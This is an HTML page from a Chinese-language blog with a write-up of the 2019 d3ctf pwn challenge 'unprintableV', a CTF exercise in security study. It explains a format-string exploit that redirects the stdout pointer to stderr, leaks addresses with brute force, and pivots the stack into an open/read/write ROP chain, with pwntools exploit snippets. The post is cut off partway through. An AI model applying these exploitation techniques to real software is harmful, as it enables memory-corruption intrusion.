@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="这是2019 d3ctf的一道pwn题，由于当时知识储备不够没做出来，赛后就好好研究，从中学到了新的知识 首先，我们检查一下程序的保护机制   除了canary，其它的保护都开了 然后，我们用IDA分析一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="d3ctf unprintableV">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="这是2019 d3ctf的一道pwn题，由于当时知识储备不够没做出来，赛后就好好研究，从中学到了新的知识 首先，我们检查一下程序的保护机制   除了canary，其它的保护都开了 然后，我们用IDA分析一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image8.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image10.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image9.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image11.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image12.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image13.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image14.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image15.JPG">
+<meta property="article:published_time" content="2019-11-30T06:02:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T10:21:18.955Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="格式化字符串漏洞">
+<meta property="article:tag" content="栈迁移">
+<meta property="article:tag" content="IO FILE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>d3ctf unprintableV | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/30/d3ctf_unprintableV/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          d3ctf unprintableV
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-30 14:02:50" itemprop="dateCreated datePublished" datetime="2019-11-30T14:02:50+08:00">2019-11-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 18:21:18" itemprop="dateModified" datetime="2025-06-21T18:21:18+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这是2019 d3ctf的一道pwn题，由于当时知识储备不够没做出来，赛后就好好研究，从中学到了新的知识</p>
+<p>首先，我们检查一下程序的保护机制</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image1.JPG" class="">
+
+<p>除了canary，其它的保护都开了</p>
+<p>然后，我们用IDA分析一下</p>
+<p>这个沙箱函数，把execve函数给禁用了，所以，我们不能getshell，但是我们可以<strong>构造ROP链来把flag读取后再打印出来</strong></p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image2.JPG" class="">
+
+<p>这是一个及其简单的程序，但是它的exp脚本会复杂的让你疯狂</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image3.JPG" class="">
+
+<p>程序一开始给了我们a的地址，也就是menu的ebp-0x8的值，接着**[close(1)把文件描述符1标准输出给关了，那么之后如果调用输出函数，将不能输出出来。]{.mark}**</p>
+<p>然后，我们看看vuln函数，存在一个很明显的**[格式化字符串漏洞，但是由于这里字符串是存储在bss段的buf里，导致这个格式化字符串漏洞不是那么容易利用。]{.mark}**</p>
+<p>如果我们想实现任意地址写，还得先在栈上特殊构造一下。</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image4.JPG" class="">
+
+<p>但是，由于**[标准输出被关闭了，导致信息泄露不出来。]{.mark}**</p>
+<p>但或许有什么办法可以解决，我们来看看printf的源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Write formatted output to stdout from the format string FORMAT.  */</span>  </span><br><span class="line"><span class="comment">/* VARARGS1 */</span>  </span><br><span class="line"><span class="type">int</span>  </span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)  </span><br><span class="line">&#123;  </span><br><span class="line">  va_list arg;  </span><br><span class="line">  <span class="type">int</span> done;  </span><br><span class="line">  </span><br><span class="line">  va_start (arg, format);  </span><br><span class="line">  done = <span class="built_in">vfprintf</span> (<span class="built_in">stdout</span>, format, arg);  </span><br><span class="line">  va_end (arg);  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> done;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>printf实际是调用fprintf，并且传入了stdout指针，我们来看看stdout指针是如何定义的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libioP.h&quot;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdin  </span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stdout  </span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> stderr  </span></span><br><span class="line">_IO_FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;  </span><br><span class="line">_IO_FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;  </span><br><span class="line">_IO_FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_stdin  </span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_stdout  </span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _IO_stderr  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AL(name) AL2 (name, _IO_##name)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AL2(name, al) \  </span></span><br><span class="line">  <span class="keyword">extern</span> __typeof (name) al __attribute__ ((alias (<span class="meta">#name),                    \  </span></span><br><span class="line">                                            visibility (<span class="string">&quot;hidden&quot;</span>)))  </span><br><span class="line">AL(<span class="built_in">stdin</span>);  </span><br><span class="line">AL(<span class="built_in">stdout</span>);  </span><br><span class="line">AL(<span class="built_in">stderr</span>);  </span><br></pre></td></tr></table></figure>
+
+<p>而stdout、stdin、stderr这些是全局指针，因此，它们肯定存在于内存中的某个地方,bss段，我们要是能把stdout指针指向_IO_2_1_stderr_，那么就能输出了，<em>IO_2_1_stderr_内部使用的文件描述符是2，而_IO_2_1_stdout_内部使用的文件描述符是1，它们在正常情况下，都向终端屏幕输出，因此，我们希望吧stdout指针指向_IO_2_1_stderr</em>，我们在程序的bss段看到了这三个指针</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image5.JPG" class="">
+
+<p>这三个指针是程序在运行时装载上去的，就犹如GOT表的装载一样，然后**[程序中只要用到这三个指针，都是从这里访问获取指针的值]{.mark}**</p>
+<p>下方不远处是buf</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image6.JPG" class="">
+
+<p>由于程序告诉了我们buf的地址，那么通过低字节覆盖，我们也能得到stderr、stdin、stdout这三个指针自己的地址。</p>
+<p>那么，<strong>[我们该如何确定格式化字符串里参数在栈中的位置，比如%6$p这些？]{.mark}</strong></p>
+<p><em><strong>[我们可以在本地先把close(1)给nop掉，再利用%p-%p-%p-%p-%p-%p-%p-%p-%p-%p…来确定。最后测试时，重新拿原文件来测试]{.mark}</strong></em></p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image7.JPG" class="">
+
+<p>假如，我们通过格式化字符串漏洞把这个数据低字节修改，使得它**[成为stdout指针的地址]{.mark}**，那么我们就能利用printf把stdout指针的内容改变，指向_IO_2_1_stderr_。但是，我们该如何来低字节修改这个数据呢？我们可以再借助这两个</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image8.JPG" class="">
+
+<p>我们可以**[先往0x7FFF7543E1D0里低字节覆盖，使得0x7FFF7543E1D0里的数据为0x7FFF7543E1C8]{.mark}**，即buf指针a的地址<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image9.JPG" class=""></p>
+<p><strong>然后，我们就能利用%t$hhn来对0x7FFF7543E1C8地址处写入了，我们先把a指向stdout</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#获得a指针的地址  </span></span><br><span class="line">stack = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)  </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack)  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stack &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%6$hhn&#x27;</span>  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;may you enjoy my printf test!\n&#x27;</span>)  </span><br><span class="line">sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line"><span class="comment">#注意，休眠是必要的  </span></span><br><span class="line">time.sleep(<span class="number">0.5</span>)  </span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stdout_bss &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span>  </span><br><span class="line">sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br></pre></td></tr></table></figure>
+
+<p>由于没有任何操作成功的提示，我们需要休眠一下，再继续发送数据</p>
+<p>现在，我们看看栈里的布局，（<strong>我们重新运行了程序，所以和前面的图有些不一样</strong>）</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image10.JPG" class="">
+
+<p>a指针<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image9.JPG" class="">成功指向了stdout指针，那么现在stdout指针的地址也在栈里了，我们就能继续利用printf，修改stdout指针的值了，我们只需低2个字节覆盖即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意，休眠是必要的  </span></span><br><span class="line">time.sleep(<span class="number">0.5</span>)  </span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(_IO_2_1_stderr_ &amp; <span class="number">0xFFF</span>) + <span class="string">&#x27;c%9$hn&#x27;</span>  </span><br><span class="line">sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br></pre></td></tr></table></figure>
+
+<p>我们之所以写**<em>IO_2_1_stderr</em> &amp; 0xFFF** 而不写_IO_2_1_stderr_ &amp; 0xFFFF的原因是，<strong>[经过调试，发现_IO_2_1_stderr_ &amp; 0xFFFF，printf执行后没有成功修改数据，可能是因为数据太大的原因]{.mark}</strong>，注意，<strong>我们对stdout指针的修改必须一次完成，因为，如果我们分开的话，由于stdout指针修改了，所以在没完成全部修改之前，stdout就指向了其他地方，不是FILE结构体，导致printf执行错误崩溃</strong></p>
+<p>我们通过_IO_2_1_stderr_ &amp; 0xFFF和%9$hn，最终导致**[stdout指针的值的倒数第四个十六进制数为0]{.mark}<strong>，由于PIE的存在，我们有</strong>[1&#x2F;16的可能]{.mark}**，使得stdout指针正好指向_IO_2_1_stderr_结构体</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image11.JPG" class="">
+
+<p>如上图，这次，我们没有成功让stdout指向_IO_2_1_stderr_，但是，只要我们不断的爆破，总有一次会成功，然后printf就可以正常输出了。</p>
+<p>我们利用这种方式检验是否成功指向_IO_2_1_stderr_</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#休眠是必要的  </span></span><br><span class="line">time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line">x = sh.recvuntil(<span class="string">&#x27;aa&#x27;</span>,timeout=<span class="number">0.5</span>)  </span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:  </span><br><span class="line">   <span class="keyword">raise</span> Exception(<span class="string">&#x27;retry&#x27;</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>假设我们已经成功将stdout指针指向了_IO_2_1_stderr_结构体，接下来，我们就要来泄露信息了</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image12.JPG" class="">
+
+<p>泄露这些信息，分别计算程序基址和libc基址，以及其他一些gadget和函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#泄露main+0x2D的地址  </span></span><br><span class="line">payload = <span class="string">&#x27;%11$p%15$pTAG&#x27;</span>  </span><br><span class="line">sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2D</span>  </span><br><span class="line">elf_base = main_addr - main_s  </span><br><span class="line">pop_rsi_addr = pop_rsi + elf_base  </span><br><span class="line">pop_rdi_addr = pop_rdi + elf_base  </span><br><span class="line">buf_addr = buf_s + elf_base  </span><br><span class="line">leave_addr = leave + elf_base  </span><br><span class="line"><span class="comment">#泄露__libc_start_main+E7的地址  </span></span><br><span class="line">__libc_start_main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;TAG&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0xE7</span>  </span><br><span class="line">libc_base = __libc_start_main_addr - __libc_start_main  </span><br><span class="line">open_addr = libc_base + open_s  </span><br><span class="line">read_addr = libc_base + read_s  </span><br><span class="line">write_addr = libc_base + write_s  </span><br><span class="line">pop_rdx_addr = libc_base + pop_rdx  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;elf_base=&#x27;</span>,<span class="built_in">hex</span>(elf_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br></pre></td></tr></table></figure>
+
+<p>以上的一些地址，我们在构造rop链实现如下代码，需要用到的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;flag&quot;</span>,<span class="number">0</span>);  </span><br><span class="line">read(fd,buf+<span class="number">0x100</span>,<span class="number">0x30</span>);  </span><br><span class="line">write(<span class="number">2</span>,buf+<span class="number">0x100</span>,<span class="number">0x30</span>);  </span><br></pre></td></tr></table></figure>
+
+<p>如果全都用printf格式化漏洞来对栈里面写ROP链，那么会比较麻烦，因此，我们决定把ROP链放入bss段的buf里面，然后修改ebp，将栈转移到buf里去</p>
+<p>那么，我们该如何做**[栈转移]{.mark}**呢？</p>
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image13.JPG" class="">
+
+<p>如图，我们通过%6$hhn来将10的位置的数据低字节覆盖，使得10的数据为12的地址，然后我们就可以通过%10$hhn来依次修改12的数据，当我们需要修改12的前一个字节时，只需再通过%6$hhn来改变10的数据，然后用%10$hhn来继续对12的前一个字节写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_i</span>(<span class="params">sh,stack,index,addr</span>):  </span><br><span class="line">   i = <span class="number">0</span>  </span><br><span class="line">   <span class="keyword">while</span> addr &gt; <span class="number">0</span>:  </span><br><span class="line">      sh.recvuntil(<span class="string">&#x27;TAG&#x27;</span>)  </span><br><span class="line">      <span class="comment">#设定栈顶向下第10个数据为stack+0x8*index  </span></span><br><span class="line">      payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack + <span class="number">0x8</span>*index + i) &amp; <span class="number">0xFF</span>) + <span class="string">&#x27;c%6$hhnTAG&#x27;</span>  </span><br><span class="line">      sh.sendline(payload)  </span><br><span class="line">      sh.recvuntil(<span class="string">&#x27;TAG&#x27;</span>)  </span><br><span class="line">      data = addr &amp; <span class="number">0xFF</span>  </span><br><span class="line">      payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(data) + <span class="string">&#x27;c%10$hhnTAG&#x27;</span>  </span><br><span class="line">      sh.sendline(payload.ljust(<span class="number">0x12C</span>-<span class="number">1</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">      addr = addr &gt;&gt; <span class="number">8</span>  </span><br><span class="line">      i+=<span class="number">1</span>  </span><br></pre></td></tr></table></figure>
+
+<p>然后，我们这样调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我们修改main的rbp，做栈迁移  </span></span><br><span class="line">write_i(sh,stack,<span class="number">3</span>,buf_addr)  </span><br><span class="line"><span class="comment">#这次，我们写main的返回地址，也就是main ebp后面那个空间  </span></span><br><span class="line">write_i(sh,stack,<span class="number">4</span>,leave_addr)  </span><br></pre></td></tr></table></figure>
+
+<p>其中leave_addr地址处是指令leave;retn，而leave指令相当于</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp  </span><br><span class="line">pop rbp  </span><br></pre></td></tr></table></figure>
+
+<img src="/ha1vk/2019/11/30/d3ctf_unprintableV/image14.JPG" class="">
+
+<p>这样，当main函数执行到leave时，有</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp  </span><br><span class="line">pop rbp  </span><br></pre></td></tr></table></figure>
+
+<p>那么，ebp的值变成了我们的buf地址，但是esp还没有指向buf，于是，我们就在接下来的返回地址覆盖为leave_addr,让它再执行一次leave，那么有</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp  </span><br><span class="line">pop rbp  </span><br></pre></td></tr></table></figure>
+
+<p>现在，<strong>[rsp指向了buf]{.mark}</strong>,但是rbp变成buf[0]的数据，这没什么问题，因为，做栈迁移，我们只需保证rsp指向了指定位置即可，由于pop rbp，rsp要加8，也就是说，这里执行后，<strong>[rsp指向了buf+8处]{.mark}</strong>，retn就会从buf+8处取出一个数据当成地址，跳到那个地址处去执行，因此，<strong>[我们只需在buf+8处写ROP链即可]{.mark}</strong>。</p>
+<p>为了能够正常到达main的栈中rbp数据处，<strong>[我们需要复原menu在栈中的rbp数据]{.mark}</strong></p>
